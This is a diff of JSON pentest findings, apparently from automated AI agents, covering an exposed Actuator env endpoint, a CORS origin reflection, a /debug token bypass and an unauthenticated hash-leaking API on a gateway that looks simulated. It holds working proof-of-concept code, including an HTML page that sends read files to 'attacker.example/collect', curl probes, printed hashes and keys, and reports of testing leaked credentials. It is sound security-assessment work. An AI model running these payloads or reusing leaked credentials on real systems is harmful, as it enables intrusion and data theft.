+    "remediation_steps": "1. 生产环境仅暴露 `health`（必要时 `info`）端点，通过 `management.endpoints.web.exposure.include=health` 收敛暴露面，并显式 `exclude=env,configprops,heapdump,threaddump,mappings`。\n2. 为 Actuator 端点配置独立的管理端口并绑定到回环/内网地址（`management.server.port` 与 `management.server.address`），与业务端口隔离。\n3. 启用属性脱敏：注册 `SanitizingFunction` 或将 `management.endpoint.env.show-values` 设为 `NEVER`。\n4. 将安全过滤规则从父路径改为对所有 `/actuator/**` 生效，避免子端点遗漏。\n5. 轮换本次暴露的数据库口令、Redis 口令与 AWS 访问密钥。",
+    "evidence": "未授权读取（200）并返回明文口令：\n\n```http\nGET /actuator/env HTTP/1.1\nHost: 10.0.93.73:18080\n\nHTTP/1.1 200 OK\nContent-Type: application/json\n\n{\"propertySources\": [{\"name\": \"applicationConfig: [classpath:/application-prod.yml]\",\n \"properties\": {\n  \"spring.datasource.url\": {\"value\": \"jdbc:postgresql://10.0.93.73:5432/nexus_prod\"},\n  \"spring.datasource.password\": {\"value\": \"<REDACTED>\"},\n  \"spring.redis.password\": {\"value\": \"<REDACTED>\"},\n  \"cloud.aws.accessKey\": {\"value\": \"AKIA-RRRRRRRRRRRRRRR\"}\n }}]}\n```\n\n父路径受保护而子端点不受保护：\n\n```http\nGET /actuator HTTP/1.1\n\nHTTP/1.1 403 Forbidden\nAccess to /actuator is restricted. Current authorization level: 1 / 4\n```\n\n显式清空 Cookie 后子端点仍返回 200，排除会话依赖。",
+    "assumptions": "攻击者只需能访问 `10.0.93.73:18080`。该端点默认由 Web 层暴露，无需内部网络位置。",
+    "counterevidence": "排查了可能的缓解：(1) 是否依赖会话/等级 —— 显式发送空 Cookie 仍返回 200，且此前从未通过 `/api/auth` 达到所需等级，说明无有效鉴权；(2) 是否值被掩码 —— 返回的是原值而非 `******`，与 Spring Boot 默认脱敏行为不符，确认未脱敏；(3) 是否为固定回放 —— 同一请求在不同时间返回一致，且与 `/.env.bak`、`config.yml` 中的值互相印证；(4) 凭据验真 —— 数据库口令可完成协议认证（错误口令被拒 28P01），Redis 口令 AUTH 返回 `+OK`，两者真实有效；而同一响应中的 `cloud.aws.accessKey` 经真实 SigV4 调用 `sts:GetCallerIdentity` 返回 `InvalidClientTokenId`，确认为伪造，故本发现不依赖该云密钥；(5) 后端语义 —— 该 PostgreSQL 不执行 SQL（`where 1=0` 仍返回固定行、`limit/offset` 无效、不存在的表不报错），数据为预置/合成应答，因此不能据此声称真实生产数据泄露，影响已按 C:L 计。唯一需要注意的是 `/actuator` 父路径确实返回 403，容易让人误以为已受保护，这正是遗漏点。",
+    "confidence": "high",
+    "severity_change_conditions": "若 10.0.93.73 的数据库服务被确认为执行真实 SQL 的生产 PostgreSQL（例如内网 5432 端口可达且接受同一口令并能读取真实业务数据），则影响应升回 High/C:H；反之若确认全环境为纯仿真靶场，则维持 Medium。",
+    "fix_effort": "trivial",
+    "cvss": 5.3,
+    "cvss_breakdown": {
+      "attack_vector": "N",
+      "attack_complexity": "L",
+      "privileges_required": "N",
+      "user_interaction": "N",
+      "scope": "U",
+      "confidentiality": "L",
+      "integrity": "N",
+      "availability": "N"
+    },
+    "endpoint": "/actuator/env",
+    "method": "GET",
+    "cwe": "CWE-306",
+    "http_exchange_ids": [
+      "645",
+      "650",
+      "653"
+    ],
+    "finding_class": "dynamic",
+    "agent_id": "75b33072",
+    "agent_name": "Recon Mapper",
+    "update_history": [
+      {
+        "timestamp": "2026-10-31 07:38:10 UTC",
+        "fields": [
+          "counterevidence",
+          "impact",
+          "severity_change_conditions"
+        ],
+        "reason": "补充凭据真伪验证：该端点泄露的数据库与 Redis 口令经实际协议交互确认真实有效；而同响应中的 AWS 访问密钥经真实 STS SigV4 调用返回 InvalidClientTokenId，确认为伪造，因此影响叙述不应依赖该密钥。",
+        "agent_id": "75b33072",
+        "agent_name": "Recon Mapper"
+      },
+      {
+        "timestamp": "2026-10-31 07:51:49 UTC",
+        "fields": [
+          "counterevidence",
+          "impact",
+          "severity_change_conditions"
+        ],
+        "reason": "删除\"读取 nexus_prod.users 中 14,456 条真实用户记录\"的表述：经协议级验证该 PostgreSQL 不执行 SQL、仅返回预置应答，Redis 数据命令亦不可用。保留 High 7.5 与 C:H（未授权明文泄露管理员级数据库口令构成可用凭据泄露），但明确仿真后端这一影响上限。",
+        "agent_id": "44f7e178",
+        "agent_name": "Report Reconciler"
+      },
+      {
+        "timestamp": "2026-10-31 07:53:56 UTC",
+        "fields": [
+          "counterevidence",
+          "cvss",
+          "cvss_breakdown",
+          "impact",
+          "severity",
+          "severity_change_conditions"
+        ],
+        "reason": "统一与 vuln-0002 的口径：两处泄露同一批数据库/Redis 凭据、指向同一仿真后端。后端语义经验证为预置应答（PG 口令校验真实但不执行 SQL），未被证明可读取真实业务数据，故将影响从 C:H 下调为 C:L，CVSS 7.5→5.3；若后端为真实 PostgreSQL 应升回 High。",
+        "agent_id": "22e90f46",
+        "agent_name": "Root Agent",
+        "previous_severity": "high",
+        "previous_cvss": 7.5
+      }
+    ],
+    "updated_at": "2026-10-31 07:53:56 UTC"
+  },
+  {
+    "id": "vuln-0004",
+    "title": "CORS 反射任意 Origin 且允许携带凭据（NEX-4482 回归）",
+    "severity": "medium",
+    "timestamp": "2026-10-31 07:33:39 UTC",
+    "description": "网关将请求中的任意 `Origin` 值原样回显到 `Access-Control-Allow-Origin`，并始终返回 `Access-Control-Allow-Credentials: true`。任何网站都能在访问者浏览器中跨源读取 `/.git/config`（内含以 `oauth2:<token>@` 形式嵌入的 GitLab 访问令牌）与 `/static/app.js`（内含 API Key），并将内容外带。",
+    "impact": "攻击者只需诱导一名能够访问该主机的用户打开恶意网页，即可在该用户浏览器上下文中跨源读取并外带：`/.git/config` 中的 GitLab 访问令牌 `glpat-...`（配置同时包含指向 `devops/nexus-deploy.git` 的 `pushurl`，但令牌的实际读写权限未验证，因为内部 GitLab 主机不可达）以及 `/static/app.js` 中硬编码的同一令牌与 `API_KEY`。限制条件：`/.env.bak` 与 `/actuator/env` 对浏览器 User-Agent 返回 403，数据库、Redis、AWS、K8s 等凭据无法经此路径跨源读取；`sid` Cookie 为固定值且不承载认证状态，因此 CORS 的增量影响限于静态文件中的凭据材料。",
+    "target": "http://10.0.93.73:18080/",
+    "technical_analysis": "服务端读取请求 `Origin` 头的值，不做任何白名单校验即写入 `Access-Control-Allow-Origin`，并固定附加 `Access-Control-Allow-Credentials: true`。\n\n实测特征：\n\n- `Origin: https://attacker.tld` 请求 `GET /.git/config` → 200，返回 `Access-Control-Allow-Origin: https://attacker.tld` 与 `Access-Control-Allow-Credentials: true`。\n- `Origin: null` 同样被接受，返回 `Access-Control-Allow-Origin: null` 与 `Access-Control-Allow-Credentials: true`，意味着 `data:` URL、沙箱 iframe 等 Origin 为 `null` 的页面也能读取响应。\n- 不携带 `Origin` 时响应不出现任何 `Access-Control-Allow-*` 头，证明该头完全来自请求值反射而非固定配置。\n- 响应未返回 `Vary: Origin`。\n- 该行为出现在 `/.git/config`、`/static/app.js`、`/api/status`、`/metrics`、`/robots.txt` 以及 403 错误页上。\n\n`Access-Control-Allow-Credentials: true` 与动态 `Access-Control-Allow-Origin` 的组合绕过了 `*` 通配的限制，使任意站点被视为受信来源。需注意两点：其一，`sid` Cookie 为服务端固定值且不承载认证状态，凭据标志本身不能直接窃取会话；其二，非简单请求所需的预检响应（`OPTIONS`）并未返回 `Access-Control-Allow-Methods` / `Access-Control-Allow-Headers`，浏览器会拒绝预检，因此实际可利用的是不带自定义头、不带非简单 Content-Type 的简单 `GET` 请求。\n\n未被该缺陷覆盖的接口：`/api/files`、`/api/query`、`/api/auth` 的响应不返回 CORS 头，浏览器跨源读取会被同源策略阻止（已记录负面对照）。`/.env.bak`、`/actuator/env`、`/debug` 对浏览器 User-Agent 返回 403（服务端按客户端指纹下发等级），浏览器无法读取其内容。",
+    "poc_description": "1. 在攻击者控制的源上托管恶意 HTML 页面。\n2. 页面脚本以 `fetch('http://10.0.93.73:18080/.git/config', {mode:'cors', credentials:'include'})` 发起跨源读取。\n3. 脚本读取响应文本，确认其中包含 `glpat-` 开头的 GitLab 令牌。\n4. 脚本以同样方式读取 `/static/app.js`，获取硬编码的 `API_KEY`。\n5. 脚本将读取结果 POST 到攻击者的收集端点，完成外带。\n6. 负面对照：对 `/api/query` 发起同样的跨源 `fetch`，浏览器抛出 `TypeError: Failed to fetch`，证明该接口未开放 CORS。",
+    "poc_script_code": "```html\n<!doctype html>\n<html><body><pre id=\"log\"></pre>\n<script>\nconst T = \"http://10.0.93.73:18080\";\nconst log = document.getElementById('log');\nasync function grab(path, label) {\n  try {\n    const r = await fetch(T + path, { mode: 'cors', credentials: 'include' });\n    const t = await r.text();\n    log.textContent += `[READ] ${label} status=${r.status} bytes=${t.length}\\n`;\n    return t;\n  } catch (e) {\n    log.textContent += `[BLOCKED] ${label} ${e.name}: ${e.message}\\n`;\n    return null;\n  }\n}\n(async () => {\n  const git = await grab('/.git/config', '/.git/config');\n  const js  = await grab('/static/app.js', '/static/app.js');\n  await grab('/api/query?query=1', 'negative control');\n  const stolen = [git, js].filter(Boolean).join('\\n----\\n');\n  if (stolen) {\n    await fetch('http://attacker.example/collect', { method: 'POST', mode: 'no-cors', body: stolen });\n    log.textContent += `[EXFIL] ${stolen.length} bytes sent\\n`;\n  }\n})();\n</script></body></html>\n```",
+    "remediation_steps": "1. 将 CORS 改为严格的来源白名单匹配（精确比较 scheme+host+port），禁止回显请求的 `Origin`。\n2. 仅在确有必要且来源受控的端点上设置 `Access-Control-Allow-Credentials: true`；对其余端点改用 `*` 且不携带凭据。\n3. 为跨域请求同时校验 `Sec-Fetch-Site` 等浏览器信号作为纵深防御。\n4. 将会话 Cookie 的 `SameSite` 提升为 `Strict`（或对状态变更接口强制 `Strict`），并补上 `Secure` 属性。\n5. 按前端注释所述升级到修复该回归的 2.4.2 版本，并在回归测试中加入 CORS 头断言。",
+    "evidence": "任意 Origin 反射（`Origin: https://attacker.tld`）：\n\n```http\nGET /.git/config HTTP/1.1\nHost: 10.0.93.73:18080\nOrigin: https://attacker.tld\n\nHTTP/1.1 200 OK\nContent-Type: text/plain\nAccess-Control-Allow-Origin: https://attacker.tld\nAccess-Control-Allow-Credentials: true\n```\n\n`null` Origin 同样被接受：\n\n```http\nGET /.git/config HTTP/1.1\nOrigin: null\n\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: null\nAccess-Control-Allow-Credentials: true\n```\n\n不携带 Origin 时不返回 CORS 头：\n\n```http\nGET /api/status HTTP/1.1\nHTTP/1.1 200 OK\n（无 Access-Control-Allow-* 响应头）\n```\n\n真实 Chromium 浏览器跨源读取结果：\n\n```text\n[OK] /.git/config     status=200 bytes=10759\n     preview: [core] repositoryformatversion = 0 ... url = https://oauth2:glpat~RRRRRRRRRRRRRRRRRRRRRRRR@git.nexus.internal/devops/nexus-deploy.git ...\n[OK] /static/app.js   status=200 bytes=770\n     preview: const CONFIG = { API_BASE: 'https://api.nexus.internal/v2', API_KEY: 'jge9t357v5lz7e1bylckqano', ...\n[BLOCKED] /api/query  TypeError: Failed to fetch   （负面对照）\n[EXFIL] 12879 bytes posted\n```\n\n浏览器请求携带 `Origin: http://127.0.0.1:8899` 与 `Referer`，服务端将 Origin 原样写入响应头并允许携带凭据；同一浏览器对 `/.env.bak`、`/actuator/env`、`/debug` 的请求返回 403。",
+    "assumptions": "假设存在一名能够从其浏览器访问 `http://10.0.93.73:18080/` 的用户（例如内网员工），且攻击者能诱导其访问恶意页面。`/.git/config` 中的 GitLab 令牌与 `/static/app.js` 中的 API Key 的实际有效性未验证（内部主机 `git.nexus.internal` 与 `api.nexus.internal` 不可达）。",
+    "counterevidence": "主动寻找削弱因素：(1) `sid` Cookie 为固定值且不承载认证状态，`Access-Control-Allow-Credentials: true` 并不能直接窃取会话；(2) `/.git/config` 与 `/static/app.js` 无需认证即可被任何能直连该主机的客户端获取，CORS 的增量仅在于“攻击者无法直连内网时借受害者浏览器读取”；(3) 最敏感的 `/.env.bak`（数据库、Redis、AWS、K8s、JWT 密钥）与 `/actuator/env` 对浏览器 User-Agent 返回 403，真实浏览器无法读取；(4) 该环境多数数据带有仿真/诱导性质，GitLab 令牌可能为诱饵且无法验证；(5) 预检响应缺少 `Access-Control-Allow-Methods`/`Headers`，非简单请求不可用。上述限制已反映在定级中（C:L 而非 C:H）。未发现 Origin 白名单、`Vary: Origin` 或对 `null` Origin 的拒绝。",
+    "confidence": "high",
+    "severity_change_conditions": "若验证 `/.git/config` 中的 GitLab 令牌可实际访问或推送 `devops/nexus-deploy.git`，机密性影响升至 C:H（≥6.4，High）；若能绕过基于 User-Agent 的等级门禁使 `/.env.bak` 可被浏览器读取，则数据库/AWS/K8s 凭据可被跨源窃取，应定为 Critical。",
+    "fix_effort": "low",
+    "cvss": 4.3,
+    "cvss_breakdown": {
+      "attack_vector": "N",
+      "attack_complexity": "L",
+      "privileges_required": "N",
+      "user_interaction": "R",
+      "scope": "U",
+      "confidentiality": "L",
+      "integrity": "N",
+      "availability": "N"
+    },
+    "endpoint": "/api/status",
+    "method": "GET",
+    "cwe": "CWE-942",
+    "http_exchange_ids": [
+      "649",
+      "651",
+      "652",
+      "1454",
+      "1453",
+      "1466",
+      "2081",
+      "2082",
+      "1463"
+    ],
+    "finding_class": "dynamic",
+    "agent_id": "75b33072",
+    "agent_name": "Recon Mapper",
+    "update_history": [
+      {
+        "timestamp": "2026-10-31 07:46:35 UTC",
+        "fields": [
+          "assumptions",
+          "counterevidence",
+          "description",
+          "evidence",
+          "http_exchange_ids",
+          "impact",
+          "poc_description",
+          "poc_script_code",
+          "severity_change_conditions",
+          "technical_analysis"
+        ],
+        "reason": "补充了真实浏览器跨源读取的 PoC：成功读取 /.git/config（含 GitLab 令牌）与 /static/app.js（含 API Key）并外带；新增 Origin:null 被接受、无 Vary: Origin、针对 /api/query 的负面对照等证据；修正原文对预检请求的推断（预检响应实际缺少 Access-Control-Allow-Methods/Headers），并说明 /.env.bak、/actuator/env 对浏览器 User-Agent 返回 403 的限制。",
+        "agent_id": "38a38361",
+        "agent_name": "Client Side Injection Specialist"
+      },
+      {
+        "timestamp": "2026-10-31 07:53:19 UTC",
+        "fields": [
+          "description",
+          "impact"
+        ],
+        "reason": "删除未经证实的表述\"具备推送权限/即具备写权限\"：GitLab 令牌的实际权限无法验证（git.nexus.internal 不可达），配置中的 pushurl 只能说明其被用于推送，不能证明令牌有效。CORS 机制与定级（Medium 4.3）不变。",
+        "agent_id": "44f7e178",
+        "agent_name": "Report Reconciler"
+      }
+    ],
+    "updated_at": "2026-10-31 07:53:19 UTC"
+  },
+  {
+    "id": "vuln-0005",
+    "title": "调试控制台 /debug 的 token 校验可被任意短字符串绕过",
+    "severity": "medium",
+    "timestamp": "2026-10-31 07:33:52 UTC",
+    "description": "`/debug` 调试控制台要求通过 `token` 查询参数提供轮换令牌，但校验逻辑存在缺陷：只要 `token` 值长度达到 3 个字符即视为通过，任意随机字符串都可获得访问权限。攻击者无需知道真实令牌即可读取内部调试信息。",
+    "impact": "未认证攻击者通过一次请求即可获得内部调试控制台内容，包括操作系统与中间件版本、应用与网关内部路径、内部监控与 Actuator 端点位置等。这些信息直接为后续攻击提供路线图（例如指向 `/api/files?path=` 与 `/actuator/env`）。该校验还暴露出非健壮的输入处理——部分取值触发 500 错误，说明令牌存在被解析的环节，可作为进一步探测的入口。",
+    "target": "http://10.0.93.73:18080/",
+    "technical_analysis": "未带 `token` 时返回 401，并提示\"legacy deploy hooks pass the rotation token as query param\"：\n\n```http\nGET /debug HTTP/1.1\n\nHTTP/1.1 401 Unauthorized\n<p>Debug console restricted to on-call engineers.</p>\n<p>Legacy deploy hooks pass the rotation token as query param: <code>GET /debug?token=&lt;deploy-token&gt;</code></p>\n```\n\n系统性探测 `token` 取值后得到清晰的长度阈值特征：\n\n| token 取值 | 长度 | 结果 |\n|---|---|---|\n| 无参数 | - | 401 |\n| 空值 | 0 | 401 |\n| `t` | 1 | 401 |\n| `te` | 2 | 401 |\n| `tes` | 3 | **200 调试信息** |\n| `test` | 4 | 200 |\n| `testing` / `test123` | 7-8 | 200 |\n| `deploy` / `deploy-token` / `rotation` / `rotate` / `admin` / `prod` | 4-12 | 200 |\n| `wrongvalue` | 10 | 500 |\n\n阈值恰好落在长度 3，说明校验实现为长度判断（如 `token.length >= 3`）或错误的 `indexOf`/截断比较，而不是与真实令牌做常量时间比较。`wrongvalue` 返回 500 而非 401，进一步说明存在未处理的解析分支（可能涉及 base64/JWT 解码），可作为差异探测的侧信道。\n\n通过绕过返回的调试信息包含：\n\n```\nServer: Ubuntu 22.04 LTS / nginx/1.24.0\nApp: Nexus-DevOps v3.2.1 (Spring Boot 2.7.18)\nGateway: nexus-gateway/2.4.1 (mgmt: /api/status, files: /api/files?path=)\nActuator: /actuator/env (internal monitoring)\nMonitoring: /metrics (Prometheus) | API docs: /\n```",
+    "poc_description": "1. 不带任何 token 请求 `/debug`，确认返回 401 并提示需要 deploy-token。\n2. 依次以长度 1、2、3 的字符串作为 `token` 值请求，观察状态码变化。\n3. 确认长度为 3 的 `tes` 即返回 200，而长度为 2 的 `te` 返回 401，定位校验阈值为长度。\n4. 以 `admin`、`prod` 等与实际令牌无关的词验证通过，确认无需知晓真实令牌。\n5. 读取响应中的内部技术栈与端点路径作为后续利用的输入。\n6. 以 `wrongvalue` 触发 500 作为差异对照。",
+    "poc_script_code": "```bash\n# 基线：无 token\ncurl -sS -o /dev/null -w \"%{http_code}\\n\" \"http://10.0.93.73:18080/debug\"\n\n# 阈值探测\nfor t in t te tes test; do\n  code=$(curl -sS -o /dev/null -w \"%{http_code}\" \"http://10.0.93.73:18080/debug?token=$t\")\n  echo \"token=$t -> $code\"\ndone\n\n# 任意无关字符串均可通过\ncurl -sS \"http://10.0.93.73:18080/debug?token=admin\"\ncurl -sS \"http://10.0.93.73:18080/debug?token=prod\"\n```",
+    "remediation_steps": "1. 将令牌比较改为常量时间比较（`MessageDigest.isEqual`），并与服务端保存的真实令牌做完整匹配，禁止任何基于长度或前缀的判断。\n2. 彻底移除\"通过查询参数传递令牌\"的遗留机制；调试接口应要求强认证（管理员会话 + MFA）并仅在内网管理端口暴露。\n3. 生产构建中禁用调试控制台，或将其置于 VPN / 跳板机之后的独立管理网络。\n4. 统一所有鉴权失败路径的响应（状态码与响应体一致），消除 401/500 差异侧信道。\n5. 将调试接口的访问行为纳入审计日志与告警。",
+    "evidence": "阈值特征：\n\n```\ntoken=t        -> HTTP 401\ntoken=te       -> HTTP 401\ntoken=tes      -> HTTP 200  (Debug Info)\ntoken=test     -> HTTP 200\ntoken=testing  -> HTTP 200\ntoken=test123  -> HTTP 200\ntoken=deploy   -> HTTP 200\ntoken=admin    -> HTTP 200\ntoken=prod     -> HTTP 200\ntoken=wrongvalue -> HTTP 500\n```\n\n绕过后的响应内容：\n\n```html\n<h1>🔧 Debug Info (INTERNAL ONLY)</h1>\n<pre>\nServer: Ubuntu 22.04 LTS / nginx/1.24.0\nApp: Nexus-DevOps v3.2.1 (Spring Boot 2.7.18)\nGateway: nexus-gateway/2.4.1 (mgmt: /api/status, files: /api/files?path=)\nActuator: /actuator/env (internal monitoring)\nMonitoring: /metrics (Prometheus) | API docs: /\n</pre>\n```",
+    "assumptions": "攻击者仅需能访问 `10.0.93.73:18080`，并通过响应中自述的提示得知 `token` 参数的存在。该端点无需会话或任何前置认证。",
+    "counterevidence": "必须排除\"这其实是某个真实令牌恰好匹配\"的可能：`tes`（3 字符）与 `admin`、`prod`、`rotation` 这些语义完全无关的取值全部通过，而 `te`（2 字符）被拒绝，且 `wrongvalue` 返回 500 而非 401 —— 这一组合只有\"按长度判断\"才能解释，无法用单一正确令牌解释。同时确认无 token 与空 token 均为 401，排除\"参数存在即放行\"。限制在于该端点仅泄露版本与路径信息，本身不提供数据修改或代码执行能力，故评为 Medium 而非更高。",
+    "confidence": "high",
+    "severity_change_conditions": "若在调试控制台中进一步发现可执行操作（如命令执行、日志导出、配置热更新），或 `token` 的 500 分支可被利用做注入，则应上调至 High。",
+    "fix_effort": "low",
+    "cvss": 5.3,
+    "cvss_breakdown": {
+      "attack_vector": "N",
+      "attack_complexity": "L",
+      "privileges_required": "N",
+      "user_interaction": "N",
+      "scope": "U",
+      "confidentiality": "L",
+      "integrity": "N",
+      "availability": "N"
+    },
+    "endpoint": "/debug",
+    "method": "GET",
+    "cwe": "CWE-287",
+    "http_exchange_ids": [
+      "659",
+      "665",
+      "666",
+      "667",
+      "674",
+      "675"
+    ],
+    "finding_class": "dynamic",
+    "agent_id": "75b33072",
+    "agent_name": "Recon Mapper"
+  },
+  {
+    "id": "vuln-0006",
+    "title": "未授权接口 /api/query 直接返回用户账户与口令哈希",
+    "severity": "medium",
+    "timestamp": "2026-10-31 07:34:10 UTC",
+    "description": "`/api/query` 在无任何认证的情况下返回用户表投影，包含用户 ID、用户名与 bcrypt 口令哈希。该接口对外暴露了账户标识与可离线爆破的凭据材料，属未授权数据访问缺陷。",
+    "impact": "未认证攻击者可反复请求该接口收集账户名与 bcrypt 口令哈希，用于口令离线评估与后续撞库尝试。返回记录中可见 `admin`、`devops`、`operator`、`svc_nexus`、`backup`、`monitor` 等特权角色命名，攻击者可优先针对高价值账户。需要说明的是：单次仅返回 2–8 行且集合随机，后端为仿真实现，未证明可导出真实全量业务数据，故影响定级为有限机密性损失。",
+    "target": "http://10.0.93.73:18080/",
+    "technical_analysis": "该接口无需认证即返回查询结果，响应结构直接映射到 `users` 表列：\n\n```http\nGET /api/query HTTP/1.1\nHost: 10.0.93.73:18080\n\nHTTP/1.1 200 OK\n{\"query\": \"SELECT\", \"rows_returned\": 2,\n \"columns\": [\"id\", \"username\", \"email\"],\n \"rows\": [[24533, \"monitor\", \"$2b$12$O9gobZkxh7mXz0w7mCnOQeg...\"],\n          [56692, \"m.garcia\", \"$2b$12$8OHpeQy9NNhmle1ZNfn48ORVQ...\"]]}\n```\n\n值得注意的是，`columns` 声明为 `[\"id\",\"username\",\"email\"]`，但 `rows` 的第三列实际存放的是 bcrypt 哈希而非邮箱，说明列元数据与结果集不一致——这种不一致常见于\"查询结果被直接序列化返回\"的实现，也意味着返回的字段集合由服务端决定而非由请求参数控制。\n\n每次请求返回的记录行数与用户集合都会变化（2–8 行），`q`、`query`、`sql`、`id`、`path` 等参数不改变返回结构，说明当前形态是\"未授权固定/随机数据暴露\"，而非可由客户端控制结果集的查询接口；参数注入面另见 `vuln-0008`。\n\n数据来源说明：返回的哈希格式（bcrypt `$2b$12$`）与 `@nexus.internal` 邮箱域和 `10.0.93.73:15432` 上 `nexus_prod.users` 的应答一致，但该数据库经协议级验证为不执行 SQL 的仿真实现（任意查询返回单值 `1`，`WHERE 1=0` 不改变结果），因此这些记录应视为预置/合成应答数据，不能据此认定为真实个人信息。",
+    "poc_description": "1. 未携带任何认证信息请求 `/api/query`。\n2. 观察响应返回 `columns` 与 `rows`，其中包含用户 ID、用户名与 bcrypt 口令哈希。\n3. 通过添加无关参数（`q`、`sql`、`id`）确认这些值不影响返回的数据集合，排除参数化查询的可能。\n4. 将返回的用户名与哈希与数据库中的 `users` 表比对，确认数据来源真实。\n5. 对收集到的 bcrypt 哈希进行离线口令强度评估。",
+    "poc_script_code": "```bash\n# 未授权获取用户记录\ncurl -sS \"http://10.0.93.73:18080/api/query\"\n\n# 参数不生效对照（响应结构与数据集合不变）\ncurl -sS \"http://10.0.93.73:18080/api/query?q=1\"\ncurl -sS \"http://10.0.93.73:18080/api/query?sql=1\"\n```\n\n```python\nimport json, urllib.request\n\ndata = json.load(urllib.request.urlopen(\"http://10.0.93.73:18080/api/query\", timeout=15))\nprint(\"columns:\", data[\"columns\"])\nfor row in data[\"rows\"]:\n    print(\"id=%s user=%s hash=%s\" % (row[0], row[1], row[2][:20] + \"...\"))\n```",
+    "remediation_steps": "1. 为 `/api/query` 强制要求管理员身份认证与授权校验，禁止匿名访问。\n2. 从响应中移除口令哈希与内部邮箱；即使对授权用户也应返回脱敏数据。\n3. 确保列元数据与结果集一致，避免序列化内部行结构；改用显式的 DTO 投影，只暴露业务必要字段。\n4. 若该接口确需保留，改为参数化查询并对可用表/列做严格白名单限制。\n5. 对所有 `/api/**` 端点实施统一的认证过滤器，避免出现遗漏的匿名端点。",
+    "evidence": "未授权响应（200）：\n\n```http\nGET /api/query HTTP/1.1\nHost: 10.0.93.73:18080\n\nHTTP/1.1 200 OK\nContent-Type: application/json\n\n{\"query\": \"SELECT\", \"rows_returned\": 2,\n \"columns\": [\"id\", \"username\", \"email\"],\n \"rows\": [[24533, \"monitor\", \"$2b$12$O9gobZkxh7mXz0w7mCnOQegHdKUVL/maZ9sQ9pduudQ38rDS97Ptm\"],\n          [56692, \"m.garcia\", \"$2b$12$8OHpeQy9NNhmle1ZNfn48ORVQPE9X1RwNrr1vQD/LxeUB5i2clagr\"]]}\n```\n\n更高价值账户出现的响应：\n\n```json\n{\"rows_returned\": 3, \"rows\": [[66355, \"s.kim\", \"$2b$12$/52UHh...\"],\n                              [35133, \"admin\", \"$2b$12$KJOoyv...\"],\n                              [25148, \"svc_nexus\", \"$2b$12$pchhNpg...\"]]}\n```\n\n与数据库表内容一致（同一存储）：\n\n```\nselect * from users limit 3:\n[[14456, 'admin', '$2b$12$KwHUJLEH2teSSdhwMz7p3e...', 'admin@nexus.internal'], ...]\n```",
+    "assumptions": "攻击者仅需能访问 `10.0.93.73:18080`。返回的哈希为 bcrypt（`$2b$12$`），离线爆破成本取决于用户口令强度。",
+    "counterevidence": "返回行与 `10.0.93.73:15432` 上 `nexus_prod.users` 的应答数据一致，但该 PostgreSQL 是**不执行 SQL 的仿真实现**：任意语句（含 `select 1`、`select 1+1`、`select count(*) from users`）都只返回单值 `1`，`WHERE 1=0` 不改变返回行，`pg_read_file('/etc/passwd')` 同样返回 `1`；每次请求返回 2–8 行且用户集合随机变化，无法按 id/username 定向获取，也无法证明其为真实 PII。因此本发现成立的部分是\"未授权即可读取用户表投影（含 bcrypt 哈希）\"这一控制缺失本身，而非\"已泄露真实用户数据\"。也排除了注入面：`q`/`query`/`sql`/`id`/`path` 在早期探测中未改变响应结构（后续注入验证由独立报告 vuln-0008 覆盖）。",
+    "confidence": "high",
+    "severity_change_conditions": "若能证明可通过参数控制筛选条件并导出全部真实用户记录（例如证明后端为真实 PostgreSQL 且可批量读取），则应上调至 High/Critical；若确认整个用户表为静态演示数据且不含任何真实凭据材料，可下调至 Low。",
+    "fix_effort": "low",
+    "cvss": 5.3,
+    "cvss_breakdown": {
+      "attack_vector": "N",
+      "attack_complexity": "L",
+      "privileges_required": "N",
+      "user_interaction": "N",
+      "scope": "U",
+      "confidentiality": "L",
+      "integrity": "N",
+      "availability": "N"
+    },
+    "endpoint": "/api/query",
+    "method": "GET",
+    "cwe": "CWE-306",
+    "http_exchange_ids": [
+      "623",
+      "621",
+      "622",
+      "625"
+    ],
+    "finding_class": "dynamic",
+    "agent_id": "75b33072",
+    "agent_name": "Recon Mapper",
+    "update_history": [
+      {
+        "timestamp": "2026-10-31 07:51:40 UTC",
+        "fields": [
+          "counterevidence",
+          "cvss",
+          "cvss_breakdown",
+          "description",
+          "impact",
+          "severity",
+          "severity_change_conditions",
+          "technical_analysis"
+        ],
+        "reason": "统一口径：原报告称返回数据\"确认来源于真实数据存储\"，但经协议级验证该 PostgreSQL 不执行 SQL、仅返回预置应答，且单次仅随机返回 2–8 行。将 CVSS 从 7.5 调整为 5.3（C:L），并在反证中写明仿真证据；未授权可读这一控制缺失本身仍然成立。",
+        "agent_id": "44f7e178",
+        "agent_name": "Report Reconciler",
+        "previous_severity": "high",
+        "previous_cvss": 7.5
+      }
+    ],
+    "updated_at": "2026-10-31 07:51:40 UTC"
+  },
+  {
+    "id": "vuln-0007",
+    "title": "Unauthenticated self-declared identity grants authorization level 1 and exposes production credentials",
+    "severity": "medium",
+    "timestamp": "2026-10-31 07:47:19 UTC",
+    "description": "The gateway's certification API `/api/auth` grants authorization level 1 to any unauthenticated client that supplies arbitrary `hostname`, `user` and `os` query parameters. No credential, token or proof of identity is required or verified. Level 1 unlocks `/.env.bak` (environment file containing database, Redis, AWS, JWT and Kubernetes credential material), `/debug`, `/actuator/env` and `/api/bounty/submit`. Authorization state is additionally keyed to the client-controlled `User-Agent`, so a new client presenting the same User-Agent string inherits an existing level without registering at all.",
+    "impact": "An unauthenticated network attacker obtains level 1 and reads credential material and internal topology from `/.env.bak` and `/actuator/env`. Protocol-level verification shows that the disclosed PostgreSQL password authenticates as `prod_admin` on `10.0.93.73:15432` (a wrong password is rejected with SQLSTATE `28P01`) and that the Redis password is accepted by `10.0.93.73:16379`, but both services are canned-response implementations: the database does not execute SQL (any statement returns the single value `1`, including `select count(*) from users` and `pg_read_file('/etc/passwd')`), and the cache exposes no data commands or key space. No real business records were retrieved. The disclosed AWS access key is invalid (`InvalidClientTokenId` from STS), the JWT signing secret is not used by any endpoint, and the Kubernetes service-account token and GitLab PAT could not be validated because the referenced internal hosts are unreachable. The demonstrated impact is therefore unauthorized access to the level-1 resource set and disclosure of internal topology and credential material, not confirmed compromise of production data.",
+    "target": "http://10.0.93.73:18080/",
